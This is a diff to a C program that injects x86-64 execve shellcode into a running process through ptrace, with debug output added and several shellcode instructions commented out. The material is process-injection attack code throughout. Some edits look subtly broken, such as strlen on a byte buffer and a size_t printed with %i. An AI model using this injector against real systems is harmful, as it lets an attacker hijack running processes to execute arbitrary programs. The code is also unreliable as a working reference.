@@ -25,7 +25,7 @@
  * SOFTWARE.
  */
 
-//#define __DEBUG__
+#define __DEBUG__
 
 #ifdef __DEBUG__
 #  include<stdio.h> // to be commented out on commit
@@ -51,11 +51,11 @@ static u_int8_t base_shellcode[] = {
   0x48, 0x31, 0xff,                         // xor rdi, rdi
   0x48, 0x31, 0xf6,                         // xor rsi, rsi
   0x48, 0x31, 0xd2,                         // xor rdx, rdx
-  0x57,                                     // push rdi
+//  0x57,                                     // push rdi
   0x48, 0x8d, 0x3d, 0x25, 0x10, 0x10, 0x10,	// lea rdi, [rip+0x10101025]
   0x48, 0x81, 0xef, 0x10, 0x10, 0x10, 0x10,	// sub rdi, 0x10101010
-  0x57,                                     // push rdi
-  0x48, 0x89, 0xe6,                         // mov rsi, rsp
+//  0x57,                                     // push rdi
+//  0x48, 0x89, 0xe6,                         // mov rsi, rsp
   0xb0, 0x3b,                               // mov al, 59 ; execve()
   0x0f, 0x05,                               // syscall
   0x48, 0x31, 0xc0,                         // xor rax,rax
@@ -134,7 +134,13 @@ int main(int argc, char *argv[])
 
   // appending `pathname` to shellcode
 
-  u_int8_t shellcode[sizeof(base_shellcode) + sizeof(pathname)];
+  size_t shellcode_size = strlen(base_shellcode) + strlen(pathname);
+
+  #ifdef __DEBUG__
+  printf("Shellcode size: %i\n", shellcode_size);
+  #endif
+
+  u_int8_t shellcode[shellcode_size];
   strcpy(shellcode, base_shellcode);
   strcat(shellcode, pathname);
 
@@ -142,6 +148,10 @@ int main(int argc, char *argv[])
 
   for(int i = 0; i < sizeof(shellcode); i++, ip++)
   {
+    #ifdef __DEBUG__
+    printf("0x%04x\t%c\t> %p\n", shellcode[i], shellcode[i], ip);
+    #endif
+
     ptrace(PTRACE_POKETEXT, pid, ip, shellcode[i]);
   }
 
